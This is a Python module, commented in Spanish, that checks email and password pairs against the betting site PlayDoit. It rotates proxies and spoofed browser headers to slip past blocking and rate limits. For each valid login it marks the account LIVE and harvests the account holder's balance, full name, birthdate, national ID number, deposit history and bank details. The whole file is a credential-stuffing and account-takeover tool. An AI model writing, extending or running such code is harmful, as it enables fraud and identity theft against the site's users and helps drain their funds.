"""
playdoit_api.py — Cliente HTTP asincrono para la API de PlayDoit.
Basado en la logica funcional de playbot.py (endpoints, headers, autenticacion por cookies).
Totalmente asincrono con httpx y compatible con proxy_pool.call_with_proxy_failover.
"""
import asyncio
import json
import logging
import random
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

import httpx
import requests

from proxy_pool import call_with_proxy_failover

logger = logging.getLogger("playdoit_api")

BASE_URL = "https://www.playdoit.mx"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
]


@dataclass
class PlaydoitCheckResult:
    ok: bool = False
    account_dead: bool = False
    error: Optional[str] = None
    email: str = ""
    password: str = ""
    balance_cash: float = 0.0
    balance_promo: float = 0.0
    balance_total: float = 0.0
    fullname: str = "Sin dato"
    birthdate: str = "Sin dato"
    national_id: str = "Sin dato"
    total_deposits: float = 0.0
    net_deposits: float = 0.0
    deposit_count: int = 0
    bank_details: str = "Sin dato"
    document_status: str = "Sin dato"
    raw_data: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "email": self.email,
            "password": self.password,
            "fullname": self.fullname,
            "birthdate": self.birthdate,
            "national_id": self.national_id,
            "balance_cash": self.balance_cash,
            "balance_promo": self.balance_promo,
            "balance_total": self.balance_total,
            "total_deposits": self.total_deposits,
            "net_deposits": self.net_deposits,
            "deposit_count": self.deposit_count,
            "bank_details": self.bank_details,
            "document_status": self.document_status,
            "status": "LIVE" if self.ok else "DEAD",
            "dead_reason": self.error if not self.ok else None,
        }


def _get_browser_headers(ua: str) -> Dict[str, str]:
    headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": random.choice([
            "es-MX,es-419;q=0.9,es;q=0.8",
            "es-ES,es;q=0.9,en;q=0.8",
            "es;q=0.9,en;q=0.8",
        ]),
        "Cache-Control": "no-cache",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": BASE_URL,
        "Pragma": "no-cache",
        "Referer": f"{BASE_URL}/",
        "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"']),
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": ua,
        "X-Requested-With": "XMLHttpRequest",
    }
    return headers


class PlaydoitClient:
    """Cliente para interactuar con PlayDoit usando requests.Session con bypass de Cloudflare WAF."""

    def __init__(self, proxy: Optional[str] = None, timeout: float = 20.0):
        self.proxy = proxy
        self.timeout = timeout
        self.ua = random.choice(USER_AGENTS)

    def _create_session(self) -> requests.Session:
        s = requests.Session()
        if self.proxy:
            s.proxies = {"http": self.proxy, "https": self.proxy}
        s.headers.update(_get_browser_headers(self.ua))
        return s

    def _sync_check(self, email: str, password: str) -> PlaydoitCheckResult:
        clean_email = email.strip().lower()
        res = PlaydoitCheckResult(email=clean_email, password=password)

        session = self._create_session()
        try:
            # 1. Warmup de cookies y sesión de navegador
            try:
                w_resp = session.get(f"{BASE_URL}/", timeout=self.timeout)
                if w_resp.status_code in (403, 429):
                    raise httpx.ProxyError(f"HTTP {w_resp.status_code} (IP de proxy bloqueada o rate-limited en warmup)")
                if w_resp.status_code >= 500:
                    raise httpx.ProxyError(f"HTTP {w_resp.status_code} (Error de servidor PlayDoit en warmup)")
                time.sleep(random.uniform(0.3, 0.8))
            except (requests.exceptions.ProxyError, requests.exceptions.Timeout, requests.exceptions.ConnectionError) as exc:
                logger.warning(f"[playdoit_api] Warmup proxy error ({clean_email}): {exc}")
                raise httpx.ProxyError(f"Warmup proxy error: {exc}")
            except httpx.ProxyError:
                raise
            except Exception as e:
                logger.warning(f"[playdoit_api] Warmup warning ({clean_email}): {e}")

            # 2. Login POST
            login_url = f"{BASE_URL}/api/login"
            login_data = {
                "login": clean_email,
                "password": password,
                "siteHost": "www.playdoit.mx",
                "privacyPolicyChecked": "true",
            }
            try:
                login_resp = session.post(
                    login_url,
                    data=login_data,
                    timeout=self.timeout,
                )
            except (requests.exceptions.ProxyError, requests.exceptions.Timeout, requests.exceptions.ConnectionError) as exc:
                logger.warning(f"[playdoit_api] Login network/proxy error ({clean_email}): {exc}")
                raise httpx.ProxyError(f"Login proxy error: {exc}")

            if login_resp.status_code in (403, 429):
                raise httpx.ProxyError(f"HTTP {login_resp.status_code} (IP de proxy bloqueada o rate-limited)")

            if login_resp.status_code >= 500:
                raise httpx.ProxyError(f"HTTP {login_resp.status_code} (Error de servidor o gateway PlayDoit)")

            try:
                login_json = login_resp.json()
            except Exception:
                res.error = f"Invalid JSON response (HTTP {login_resp.status_code})"
                res.account_dead = False
                return res

            if not isinstance(login_json, dict):
                res.error = f"Unexpected JSON response format (HTTP {login_resp.status_code})"
                res.account_dead = False
                return res

            if not login_json.get("success"):
                err_msg = login_json.get("message") or login_json.get("error") or "Credenciales invalidas"
                res.account_dead = True
                res.error = f"Login fallido: {err_msg}"
                return res

            # Login exitoso!
            res.ok = True
            res.raw_data["login"] = login_json

            # 3. Post-login GETs con la sesión activa
            # Balance
            try:
                bal_resp = session.get(f"{BASE_URL}/api/player/balance", timeout=self.timeout)
                if bal_resp.status_code == 200:
                    bj = bal_resp.json()
                    res.balance_cash = float(bj.get("cash", 0.0) or 0.0)
                    res.balance_promo = float(bj.get("promo", 0.0) or 0.0)
                    res.balance_total = float(bj.get("balance", (res.balance_cash + res.balance_promo)) or 0.0)
                    res.raw_data["balance"] = bj
            except Exception as e:
                logger.warning(f"[playdoit_api] Error en balance ({clean_email}): {e}")

            # Player info
            try:
                ply_resp = session.get(f"{BASE_URL}/api/player", timeout=self.timeout)
                if ply_resp.status_code == 200:
                    pj = ply_resp.json()
                    fname = (pj.get("firstName") or "").strip()
                    lname = (pj.get("lastName") or "").strip()
                    full = f"{fname} {lname}".strip()
                    res.fullname = full if full else "Sin dato"
                    res.birthdate = pj.get("birthDate") or "Sin dato"
                    res.national_id = pj.get("nationalIdNumber") or "Sin dato"
                    res.raw_data["player"] = pj
            except Exception as e:
                logger.warning(f"[playdoit_api] Error en player ({clean_email}): {e}")

            # Methods / Deposits
            try:
                met_resp = session.get(f"{BASE_URL}/api/payment/methods", timeout=self.timeout)
                if met_resp.status_code == 200:
                    mj = met_resp.json()
                    res.total_deposits = float(mj.get("totalDeposits", 0.0) or 0.0)
                    res.net_deposits = float(mj.get("netDeposits", 0.0) or 0.0)
                    res.deposit_count = int(mj.get("totalDepositCount", 0) or 0)
                    res.raw_data["methods"] = mj
            except Exception as e:
                logger.warning(f"[playdoit_api] Error en methods ({clean_email}): {e}")

            # Payment Details
            try:
                det_resp = session.get(f"{BASE_URL}/api/player/paymentDetails", timeout=self.timeout)
                if det_resp.status_code == 200:
                    dj = det_resp.json()
                    extracted_details = []
                    if isinstance(dj, list):
                        for item in dj:
                            fields = item.get("fields", [])
                            item_dict = {}
                            for f in fields:
                                f_key = f.get("field", "")
                                f_val = f.get("defaultValue", "")
                                if any(k in f_key for k in ("BankName", "Number", "Name")) and f_val:
                                    item_dict[f_key] = f_val
                            if item_dict:
                                extracted_details.append(item_dict)
                    if extracted_details:
                        res.bank_details = json.dumps(extracted_details, ensure_ascii=False)
                    res.raw_data["paymentDetails"] = dj
            except Exception as e:
                logger.warning(f"[playdoit_api] Error en paymentDetails ({clean_email}): {e}")

            # Documents
            try:
                doc_resp = session.get(f"{BASE_URL}/api/player/documents", timeout=self.timeout)
                if doc_resp.status_code == 200:
                    dcj = doc_resp.json()
                    res.document_status = dcj.get("documentStatus") or "Sin dato"
                    res.raw_data["documents"] = dcj
            except Exception as e:
                logger.warning(f"[playdoit_api] Error en documents ({clean_email}): {e}")

            return res
        finally:
            try:
                session.close()
            except Exception:
                pass

    async def check_credentials_and_fetch(
        self, email: str, password: str
    ) -> PlaydoitCheckResult:
        return await asyncio.to_thread(self._sync_check, email, password)


async def check_playdoit_account(
    email: str, password: str, proxy: Optional[str] = None
) -> PlaydoitCheckResult:
    """Ejecuta un check individual sobre PlayDoit."""
    client = PlaydoitClient(proxy=proxy)
    return await client.check_credentials_and_fetch(email, password)


async def check_playdoit_with_failover(
    email: str, password: str
) -> Tuple[PlaydoitCheckResult, Optional[str]]:
    """
    Ejecuta el check de PlayDoit rotando proxies en caso de fallo de red/proxy.
    Retorna (resultado, proxy_utilizado).
    """
    async def _runner(proxy: Optional[str] = None) -> PlaydoitCheckResult:
        return await check_playdoit_account(email, password, proxy=proxy)

    try:
        result, used_proxy = await call_with_proxy_failover(
            _runner,
            proxy_kwarg="proxy",
            max_attempts=4,
        )
        return result, used_proxy
    except Exception as exc:
        logger.warning(f"[playdoit_api] Todos los proxies fallaron para {email}: {exc}")
        fail_res = PlaydoitCheckResult(
            email=email.strip().lower(),
            password=password,
            ok=False,
            account_dead=False,
            error=f"Fallo de conexión tras reintentos con proxies: {exc}",
        )
        return fail_res, None

